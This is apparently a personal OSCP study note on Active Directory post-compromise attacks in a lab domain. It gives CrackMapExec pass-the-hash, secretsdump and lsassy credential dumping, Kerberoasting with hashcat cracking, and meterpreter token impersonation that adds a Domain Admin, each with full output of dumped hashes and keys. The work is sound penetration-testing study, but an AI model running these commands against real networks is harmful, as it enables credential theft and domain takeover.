---
aliases:
  - Active Directory Post Compromise Attacks
tags:
  - tech
  - cybsec
  - certification
  - oscp
  - active_directory
  - post_compromise_attacks
author: Mehdi N Tehrani
creat_date: 2023-12-09
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Pass Attacks
## Pass the password
#pass_the_password
Tools:
### CrackMapExec
#crackmapexec
Command:
`crackmapexec smb <ip/subnet> -u <user> -p <pass>`
Output:
```
SMB         192.168.122.57  445    ADONIS           [*] Windows 10.0 Build 22621 x64 (name:ADONIS) (domain:ATLANTIS.local) (signing:False) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [*] Windows 10.0 Build 20348 x64 (name:ZEUS-DC) (domain:ATLANTIS.local) (signing:True) (SMBv1:False)
SMB         192.168.122.57  445    ADONIS           [+] ATLANTIS.local\jackc:Password12345! (Pwn3d!)
SMB         192.168.122.69  445    ZEUS-DC          [+] ATLANTIS.local\jackc:Password12345! (Pwn3d!)
SMB         192.168.122.141 445    BELLE            [*] Windows 10.0 Build 22621 x64 (name:BELLE) (domain:ATLANTIS.local) (signing:False) (SMBv1:False)
SMB         192.168.122.141 445    BELLE            [+] ATLANTIS.local\jackc:Password12345! (Pwn3d!)
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
### metasploit hashdump
#hashdump #metasploit 
`meterpreter> hashdump`

### secretsdump
Important things to consider:
	- SAM hashes: any local admins and other users. Guest and WDAG user are not useful as much.
	- If any passwords are stored in registry, they can be viewed here in clear text
	- **wdigest** #wdigest is an old protocol. if any old machine exists, it can be easily compromised
		- *wdigest* can also be forced to be enabled. 
		- there are better options though
	- 


#secretsdump
Command:
`secretsdump.py '<domain>/<user>:<pass>@<ip>'`
Output (against domain server):
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3ca7aed549f52b63a2770b031edcea25
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:458c99ef0a3b788a0e082565ec1f471b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ATLANTIS\ZEUS-DC$:aes256-cts-hmac-sha1-96:334d6b69da54fddd459060753f85c9461ec8380686810ea93da0849161323faa
ATLANTIS\ZEUS-DC$:aes128-cts-hmac-sha1-96:21f33352569770b1a4b04dbf3a356e61
ATLANTIS\ZEUS-DC$:des-cbc-md5:0d084689c7a1adfe
ATLANTIS\ZEUS-DC$:aad3b435b51404eeaad3b435b51404ee:424e2403da7b1a74588a73823d885a0e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x050cd727c3f83ef9ad0a4d55a35a3e12954ffe4d
dpapi_userkey:0x32036045b39fba68ab5fc336d27b45184561fe7f
[*] NL$KM 
 0000   5D 41 D0 D5 9E DB 71 02  28 1C 96 97 BC 7D 0F 0A   ]A....q.(....}..
 0010   C7 97 37 8B 8C 82 7B A5  85 5F 6B BD 05 E1 46 93   ..7...{.._k...F.
 0020   E5 EA 26 2E 65 34 0B B4  07 13 1F B8 4F 60 70 EE   ..&.e4......O`p.
 0030   2E E7 C7 9D 74 F9 4A CC  D8 29 33 50 3E 3C D2 FF   ....t.J..)3P><..
NL$KM:5d41d0d59edb7102281c9697bc7d0f0ac797378b8c827ba5855f6bbd05e14693e5ea262e65340bb407131fb84f6070ee2ee7c79d74f94accd82933503e3cd2ff
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:458c99ef0a3b788a0e082565ec1f471b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:db56f74ecdfe714d0241e12ef0c62954:::
ATLANTIS.local\jackc:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
ATLANTIS.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
ATLANTIS.local\mikem:1105:aad3b435b51404eeaad3b435b51404ee:7eba549406169e2f2488afc3b444f6ce:::
ATLANTIS.local\Robs:1106:aad3b435b51404eeaad3b435b51404ee:cc242f3d0738600d44e5836271246727:::
ZEUS-DC$:1000:aad3b435b51404eeaad3b435b51404ee:424e2403da7b1a74588a73823d885a0e:::
ADONIS$:1107:aad3b435b51404eeaad3b435b51404ee:923500c041807a2d1303c0f93a0875a1:::
BELLE$:1108:aad3b435b51404eeaad3b435b51404ee:7f5b0fce1009faa3d1250892c199844f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4ad5814ac47acdae8caac5c7dc55a8e95b41d22066acc28a70a22f4b97f840bb
Administrator:aes128-cts-hmac-sha1-96:39038e268f843cc9e2de06d6a7703c2d
Administrator:des-cbc-md5:9716cd5e19fdb340
krbtgt:aes256-cts-hmac-sha1-96:eae8749e255d0e80b76827780bbd801959b53ffab017d13dc8a8d2688cf034d8
krbtgt:aes128-cts-hmac-sha1-96:f9c73f6a9de489f7fe9e53b1f4172b0d
krbtgt:des-cbc-md5:5273aba1a17a3494
ATLANTIS.local\jackc:aes256-cts-hmac-sha1-96:2a3815a07e5007a282eb51f6910eeb316a8cc151a425bfbab534e57bcfe8d5f0
ATLANTIS.local\jackc:aes128-cts-hmac-sha1-96:629ab3c6d7f0eaf3b17a9c139ad2a89d
ATLANTIS.local\jackc:des-cbc-md5:3dc15b61e3985419
ATLANTIS.local\SQLService:aes256-cts-hmac-sha1-96:900c77c99577cbd728d2242efc3a4c7f2e8cc345263dd7307d840dc6cebb50e2
ATLANTIS.local\SQLService:aes128-cts-hmac-sha1-96:ecf75deb744976c5e84b90f3407f6bd4
ATLANTIS.local\SQLService:des-cbc-md5:c4675ed94f5b6bcb
ATLANTIS.local\mikem:aes256-cts-hmac-sha1-96:fce9ec504c5d15f29992d5147493ad81eeaf4992f8f166df705c198e58bbac6e
ATLANTIS.local\mikem:aes128-cts-hmac-sha1-96:400ba7da4c6ea81205132262f5bd9479
ATLANTIS.local\mikem:des-cbc-md5:fb0d73d55d943b5d
ATLANTIS.local\Robs:aes256-cts-hmac-sha1-96:b9a03f9e75faed8a141af4a2c0969715f254c04db36ef1099c6ca3fee3adc141
ATLANTIS.local\Robs:aes128-cts-hmac-sha1-96:45c16ca4fd8d538209fd99494c104f05
ATLANTIS.local\Robs:des-cbc-md5:0220265158cda258
ZEUS-DC$:aes256-cts-hmac-sha1-96:334d6b69da54fddd459060753f85c9461ec8380686810ea93da0849161323faa
ZEUS-DC$:aes128-cts-hmac-sha1-96:21f33352569770b1a4b04dbf3a356e61
ZEUS-DC$:des-cbc-md5:ce51519d98796164
ADONIS$:aes256-cts-hmac-sha1-96:f0b7b3afceaa29565e6dd464c02d957094457b25ac7d5612311c0ee2a1006ef5
ADONIS$:aes128-cts-hmac-sha1-96:a97c08e43ea20f1c72dc310432935433
ADONIS$:des-cbc-md5:0b0d159432e9a2d3
BELLE$:aes256-cts-hmac-sha1-96:cef814ca1ea4c0cdec5025a19fdd24f21a573bb625f3bc2f1c91a149f617dc0f
BELLE$:aes128-cts-hmac-sha1-96:d909ed04a3267b55818ed55faca152bb
BELLE$:des-cbc-md5:3b0b4c0d263d97df
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```
Output (against a domain computer)
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x684964f3fdbb00ed957c25b82b874c95
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1653f6c66d29fcd0bfbd4637f7cd7f32:::
Jack:1001:aad3b435b51404eeaad3b435b51404ee:83e299a41d243c3a62d032b50d80560c:::
[*] Dumping cached domain logon information (domain/username:hash)
ATLANTIS.LOCAL/Administrator:$DCC2$10240#Administrator#4b4ae7f7418197ad4d4fbe0c6ad904e1
ATLANTIS.LOCAL/jackc:$DCC2$10240#jackc#730205dc75b31555d944178274247a25
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ATLANTIS\ADONIS$:aes256-cts-hmac-sha1-96:f0b7b3afceaa29565e6dd464c02d957094457b25ac7d5612311c0ee2a1006ef5
ATLANTIS\ADONIS$:aes128-cts-hmac-sha1-96:a97c08e43ea20f1c72dc310432935433
ATLANTIS\ADONIS$:des-cbc-md5:e3c2586e97e5028c
ATLANTIS\ADONIS$:aad3b435b51404eeaad3b435b51404ee:923500c041807a2d1303c0f93a0875a1:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf5cef64e58c27ba42f1b027107200b69a09e84a1
dpapi_userkey:0x308f6cc3cf039296cb81b61c42ce0bc24752b067
[-] LSA hashes extraction failed: 'HashRecords'
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

## Pass the hash
### CrackMapExec
#pass_the_hash #crackmapexec 
Command:
`crackmapexec smb <ip/subnet> -u <local_admin_user> -H <local_admin_hash> --local-auth`
the hash should be *NTLMv1*. It won't work with NTLMv2.
Output:
```
SMB         192.168.122.57  445    ADONIS           [*] Windows 10.0 Build 22621 x64 (name:ADONIS) (domain:ADONIS) (signing:False) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [*] Windows 10.0 Build 20348 x64 (name:ZEUS-DC) (domain:ZEUS-DC) (signing:True) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [-] ZEUS-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.122.57  445    ADONIS           [+] ADONIS\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.122.141 445    BELLE            [*] Windows 10.0 Build 22621 x64 (name:BELLE) (domain:BELLE) (signing:False) (SMBv1:False)
SMB         192.168.122.141 445    BELLE            [+] BELLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
```

CrackMapExec other use cases:
dump the **SAM**: `--sam`    #sam
enumerate **shares**: `--shares`
dump **Local Security Authority**: `--lsa`     #local_security_authority #lsa
	- dumps different versions of passwords
	- DCC2 hash #dcc2 cracking this hash can be very slow

```
$ crackmapexec smb 192.168.122.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth --sam --shares
SMB         192.168.122.57  445    ADONIS           [*] Windows 10.0 Build 22621 x64 (name:ADONIS) (domain:ADONIS) (signing:False) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [*] Windows 10.0 Build 20348 x64 (name:ZEUS-DC) (domain:ZEUS-DC) (signing:True) (SMBv1:False)
SMB         192.168.122.57  445    ADONIS           [+] ADONIS\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.122.69  445    ZEUS-DC          [-] ZEUS-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.122.57  445    ADONIS           [*] Dumping SAM hashes
SMB         192.168.122.57  445    ADONIS           Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.122.57  445    ADONIS           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.122.57  445    ADONIS           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.122.57  445    ADONIS           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1653f6c66d29fcd0bfbd4637f7cd7f32:::
SMB         192.168.122.57  445    ADONIS           Jack:1001:aad3b435b51404eeaad3b435b51404ee:83e299a41d243c3a62d032b50d80560c:::
SMB         192.168.122.57  445    ADONIS           [+] Added 5 SAM hashes to the database
SMB         192.168.122.57  445    ADONIS           [*] Enumerated shares
SMB         192.168.122.57  445    ADONIS           Share           Permissions     Remark
SMB         192.168.122.57  445    ADONIS           -----           -----------     ------
SMB         192.168.122.57  445    ADONIS           ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.122.57  445    ADONIS           C$              READ,WRITE      Default share
SMB         192.168.122.57  445    ADONIS           IPC$            READ            Remote IPC
SMB         192.168.122.141 445    BELLE            [*] Windows 10.0 Build 22621 x64 (name:BELLE) (domain:BELLE) (signing:False) (SMBv1:False)
SMB         192.168.122.141 445    BELLE            [+] BELLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.122.141 445    BELLE            [*] Dumping SAM hashes
SMB         192.168.122.141 445    BELLE            Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.122.141 445    BELLE            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.122.141 445    BELLE            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.122.141 445    BELLE            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1653f6c66d29fcd0bfbd4637f7cd7f32:::
SMB         192.168.122.141 445    BELLE            Mike:1002:aad3b435b51404eeaad3b435b51404ee:ee6641d972851e2853579512b85bd2ad:::
SMB         192.168.122.141 445    BELLE            [+] Added 5 SAM hashes to the database
SMB         192.168.122.141 445    BELLE            [*] Enumerated shares
SMB         192.168.122.141 445    BELLE            Share           Permissions     Remark
SMB         192.168.122.141 445    BELLE            -----           -----------     ------
SMB         192.168.122.141 445    BELLE            ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.122.141 445    BELLE            C$              READ,WRITE      Default share
SMB         192.168.122.141 445    BELLE            IPC$            READ            Remote IPC
SMB         192.168.122.141 445    BELLE            Users           READ,WRITE      
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

```
$ crackmapexec smb 192.168.122.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth --lsa  

[.......]

B         192.168.122.141 445    BELLE            [*] Windows 10.0 Build 22621 x64 (name:BELLE) (domain:BELLE) (signing:False) (SMBv1:False)
SMB         192.168.122.141 445    BELLE            [+] BELLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.122.141 445    BELLE            [+] Dumping LSA secrets
SMB         192.168.122.141 445    BELLE            ATLANTIS.LOCAL/Administrator:$DCC2$10240#Administrator#4b4ae7f7418197ad4d4fbe0c6ad904e1: (2023-12-08 05:55:56)                                                                                                                                                      
SMB         192.168.122.141 445    BELLE            ATLANTIS.LOCAL/jackc:$DCC2$10240#jackc#730205dc75b31555d944178274247a25: (2023-12-08 10:19:18)
SMB         192.168.122.141 445    BELLE            ATLANTIS\BELLE$:aes256-cts-hmac-sha1-96:cef814ca1ea4c0cdec5025a19fdd24f21a573bb625f3bc2f1c91a149f617dc0f
SMB         192.168.122.141 445    BELLE            ATLANTIS\BELLE$:aes128-cts-hmac-sha1-96:d909ed04a3267b55818ed55faca152bb
SMB         192.168.122.141 445    BELLE            ATLANTIS\BELLE$:des-cbc-md5:dc7ca17076130df4
SMB         192.168.122.141 445    BELLE            ATLANTIS\BELLE$:plain_password_hex:4f07a80e3dc20c2a4156610ae2160ffc2fe330c4c28928043a6289f14c54de6936b09883673e65ac151dbe75474296f4be0fab147e2586d86ae55116d48bc726d400e1703e2c8ab5de18b768a2c16679510dbcb3948cf76a3486397b5c9459c813baa7292398fee8d593844f14d040c636d027f1677351d3cd6a9a704ffec6a5d9d962206393c6f659946f4cf714a216a92fff99d5db06dccc177d8c8b8e6e19380f1863cea5e504f4d12b3c3d5c48db6e1ad56f5d6c5ad3bcbb87682f00b79c0f9ba49b7a6dbae57aa5651960dc71abc337d593fc34a9f00d14f7dbe78f7bb7dd252f5af761b9d2e3aab299eba15999                                                         
SMB         192.168.122.141 445    BELLE            ATLANTIS\BELLE$:aad3b435b51404eeaad3b435b51404ee:7f5b0fce1009faa3d1250892c199844f:::
SMB         192.168.122.141 445    BELLE            dpapi_machinekey:0xf5cef64e58c27ba42f1b027107200b69a09e84a1
dpapi_userkey:0x308f6cc3cf039296cb81b61c42ce0bc24752b067
```

#### Modules
**lsassy module** #lsassy
Dump *lsass* #lsass
*lsass* enforces security policy, but also stores credential e.g. like an active login i.e. secrets stored in memory

List all modules for SMB: `crackmapexec smb -L`

Command:
`crackmapexec smb <ip/subnet> -u <user> -H <ntlm_hash> --local-auth -M lsassy`
Output (failed to dump lsass):
```
SMB         192.168.122.57  445    ADONIS           [*] Windows 10.0 Build 22621 x64 (name:ADONIS) (domain:ADONIS) (signing:False) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [*] Windows 10.0 Build 20348 x64 (name:ZEUS-DC) (domain:ZEUS-DC) (signing:True) (SMBv1:False)
SMB         192.168.122.69  445    ZEUS-DC          [-] ZEUS-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.122.57  445    ADONIS           [+] ADONIS\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.122.141 445    BELLE            [*] Windows 10.0 Build 22621 x64 (name:BELLE) (domain:BELLE) (signing:False) (SMBv1:False)
SMB         192.168.122.141 445    BELLE            [+] BELLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
LSASSY      192.168.122.57  445    ADONIS           [-] Unable to dump lsass
LSASSY      192.168.122.141 445    BELLE            [-] Unable to dump lsass
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

### CrackMapExec (CME) Database
#cmedb
Command: `cmedb`
cmedb Prompt: `cmedb (default)(smb) > `
Commands in cmedb shell:
	- `hosts`
	- `groups`
	- `creds`
	- `shares`

### secretsdump
Command:
`$ secretsdump.py 'administrator:@<ip>' -hashes <ntlm_hash>`
Output:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x684964f3fdbb00ed957c25b82b874c95
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1653f6c66d29fcd0bfbd4637f7cd7f32:::
Jack:1001:aad3b435b51404eeaad3b435b51404ee:83e299a41d243c3a62d032b50d80560c:::
[*] Dumping cached domain logon information (domain/username:hash)
ATLANTIS.LOCAL/Administrator:$DCC2$10240#Administrator#4b4ae7f7418197ad4d4fbe0c6ad904e1
ATLANTIS.LOCAL/jackc:$DCC2$10240#jackc#730205dc75b31555d944178274247a25
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ATLANTIS\ADONIS$:aes256-cts-hmac-sha1-96:f0b7b3afceaa29565e6dd464c02d957094457b25ac7d5612311c0ee2a1006ef5
ATLANTIS\ADONIS$:aes128-cts-hmac-sha1-96:a97c08e43ea20f1c72dc310432935433
ATLANTIS\ADONIS$:des-cbc-md5:e3c2586e97e5028c
ATLANTIS\ADONIS$:aad3b435b51404eeaad3b435b51404ee:923500c041807a2d1303c0f93a0875a1:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf5cef64e58c27ba42f1b027107200b69a09e84a1
dpapi_userkey:0x308f6cc3cf039296cb81b61c42ce0bc24752b067
[-] LSA hashes extraction failed: 'HashRecords'
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
## Cracking secrets
#crack_password #crack_secret
only NT portion of the NTLM hash is required for cracking the hash. Although both can be passed as an argument too.
NTLM hash for user 'administrator': 
```
aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
^ LM portion
                                 ^ NT portion
```

Command:
`hashcat -m 1000 '7facdc498ed1680c4fd1448319a8c04f' /usr/share/wordlists/rockyou.txt`

If GPU driver is not allowing hashcat to use GPU, pass `-D 1` 


## Mitigations
## Limit account re-use
- Disable guest and admin accounts
## Strong password (at least 14 chars) longer the better

## Privilege Access Management (PAM)
#privilege_access_management  #cyberark #delinea #thycotic #laps
These use a pool of accounts for admin access and automatically rotate their strong passwords
Use solutions like *CyberArk*, *Delinea*, *Thycotic*, or *Microsoft LAPS* 


# Kerberoasting
![[Pasted image 20231209145205.png|800]]
[Article in Medium website](https://medium.com/@Shorty420/kerberoasting-9108477279cc)

## Attack

Command
`$ sudo GetUserSPNs.py 'ATLANTIS.local/jackc:Password12345!' -dc-ip 192.168.122.69 -request`
Output:
```
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName                     Name        MemberOf                                                       PasswordLastSet      LastLogon 
---------------------------------------  ----------  -------------------------------------------------------------  -------------------  ---------
ZEUS-DC/SQLService.ATLANTIS.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=ATLANTIS,DC=local  2023-12-08 15:57:59  <never>   



$krb5tgs$23$*SQLService$ATLANTIS.LOCAL$ZEUS-DC/SQLService.ATLANTIS.local~60111*$980957eeae6098b9871f2d254a70aa85$3d1af4cf6f1117cbf05c08680090631937c4fbe657cf7d3dfae8d022f0b6c767e27268231cb7d8172898455d93c117d319874b08e095754516eeb0443ca01370c81c5dbfff37e70a05d48b4ac83435b955a4d0257193412f5e3a645aa5a3d48ffc3453142b25a13d81fcddee6269ea9f39b32704d02ad0a88a526a42a46f348543b839e0655daa4de1c5f89120d19c3dcd3335d3d26f011adce7777062bfdc05db3b17d90d57c98c13c8c161c08dfc1f688d7c7a7970560545e6d924789513a26b30368275cbcce145c9b38fa0019a81662b97c5eaa8ae095a1c2fac6b9d718071c18b3a8845ea5293bf6d41a080551b642dcb6ee805eb9fac31b9239eba4f57b8dd9e1bcd9069aae03ceaa53a41dcaed3739e6fbd622f487db019f7566d2edfd1800cb87510c05f086d8d86ae1bd7f895801bd9e06aff38a0aa19ca82e077dc95b0bb3eb0f23a029bcbfe17f35452a073f2487d27164f9d807f03fed5723c2637672a2a019cf46229acd91b7ad28e788223d852161883a87ca1dd07227993c384e3be8c244ea3c1fdbf1dedac39b7b2d932241cc9b16ae29e24ceeccafa6301f06b7bbf4d1e1a135416206fdb54b996e65b2c153fe6f7395cb18db80282b57194039370617987c2a7519203fc437e0243045ace9e7b3f29b891bf255fd2c6c14e1f645853df194faf31a0027a51827d37cf16582cde4d11ded956f6c345d3adf2e338839d89b75f582507fcbf7a6654fc6abf47f01947b55480b511582082f609b55568393ffbf9b7b7204a6cc5475acc249561e5302d332e55f648e5516f8530569ea2e5894f0253c9dde0670b06022832be5876ced0444012af50c4c68615a59c5c350629f7ab92b69229cb3ad618f1fa937d4ecf1f592dd14f15bcde142a2772727c75b398f85421031b307b43cb533f8cae32e0b09050808b0e5d38fea315eb5e3352f942ca152709c43e18c4dcb466ba1e98b80af6b557ff485452adb2e095c9d14bd3441b301b99812f0659d45479728b7117bf3c0b978ef8d1a9c8caf4f746dafa571a7c3ab4703b294d572c05ec4692f4106e5167647adf18735e890be4b6d942b914b3e6654e2471b95a1ac102d16bbdd4919cfda59299620fd5f9c91fe991c3e8cb29b46b2c8b6feb7f08000b43847057ac0d8f95ab4aeace61f82366c1e2dd722582d167b84b474640619964f7789331fd8d4d11e89a23c429cd0ab8118dbb9c1bbbb4ff15a16144b960b869a3141390ebd30a12de8803a0c4892f5513d32f09926663d5c30940ca872d5723247a0129419e9a6cddd45adda6ffa616c0a91522ee9058202e4ae963b2b6a838fd6cc41dac9f4e0706c1c781e437bfc846387587b12381e245c2c1e13333f063ee92c52e0f7453d6aa8d9e06ff13fd01d9f42c3599508e8ee1e73c745e6952d79f73c98c9fb7d12ed9b458f51535bedf0c5900a90005640e38f51695ead64af7c4aa7f4e77e320a1e1551b0c14859528a95bf934f05d2f235f042023f74c55edda34ab8994e4160acaa084b8296f8b4510d4
```
> Make sure the time on domain server and the attacker machine are in sync, otherwise the `GetUserSPNs.py` command fails as Kerberos expects times to be in sync.
```
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```

Crack the hash:
`hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`
Output:
```
$krb5tgs$23$*SQLService$ATLANTIS.LOCAL$ZEUS-DC/SQLService.ATLANTIS.local~60111*$980957eeae6098b9871f2d254a......e4160acaa084b8296f8b4510d4:MYpassword123#
```

## Mitigation
- Strong passwords
- Least privilege

# Token Impersonation
Two types:
- **Delegate**: when you log into a machine, a delegate token is stored on the machine
- **Impersonate**: non-interactive like a domain logon script or attaching a network drive
## Attack
### Incognito
#metasploit #incognito #incognito_attack
Can use metasploit:
#create_domain_admin #domain_admin #ad_create_user #create_user_ad
```
meterpreter > shell
C:\Windows\System32> whoami
nt authority\system

meterpreter > load incognito
# User should have logged in
meterpreter > list_tokens -u <user>
meterpreter > list_tokens -g <group>

meterpreter > impersonate_token <domain>\\<user>
meterpreter > shell
C:\Windows\System32> whoami
<domain>\<user>

# go back to 'nt authority' user
meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
C:\Windows\System32> net user /add <new_user> <pass> /domain
C:\Windows\System32> net group "Domain Admins" <new_user> /add /domain
```

- Proof of concept:
	- Secretsdump on domain controller!
```
secretsdump.py <domain>/<new_user>:'<pass>'@<domain_server>
```
Output
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3ca7aed549f52b63a2770b031edcea25
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:458c99ef0a3b788a0e082565ec1f471b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ATLANTIS\ZEUS-DC$:aes256-cts-hmac-sha1-96:334d6b69da54fddd459060753f85c9461ec8380686810ea93da0849161323faa
ATLANTIS\ZEUS-DC$:aes128-cts-hmac-sha1-96:21f33352569770b1a4b04dbf3a356e61
ATLANTIS\ZEUS-DC$:des-cbc-md5:0d084689c7a1adfe
ATLANTIS\ZEUS-DC$:aad3b435b51404eeaad3b435b51404ee:424e2403da7b1a74588a73823d885a0e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x050cd727c3f83ef9ad0a4d55a35a3e12954ffe4d
dpapi_userkey:0x32036045b39fba68ab5fc336d27b45184561fe7f
[*] NL$KM 
 0000   5D 41 D0 D5 9E DB 71 02  28 1C 96 97 BC 7D 0F 0A   ]A....q.(....}..
 0010   C7 97 37 8B 8C 82 7B A5  85 5F 6B BD 05 E1 46 93   ..7...{.._k...F.
 0020   E5 EA 26 2E 65 34 0B B4  07 13 1F B8 4F 60 70 EE   ..&.e4......O`p.
 0030   2E E7 C7 9D 74 F9 4A CC  D8 29 33 50 3E 3C D2 FF   ....t.J..)3P><..
NL$KM:5d41d0d59edb7102281c9697bc7d0f0ac797378b8c827ba5855f6bbd05e14693e5ea262e65340bb407131fb84f6070ee2ee7c79d74f94accd82933503e3cd2ff
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:458c99ef0a3b788a0e082565ec1f471b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:db56f74ecdfe714d0241e12ef0c62954:::
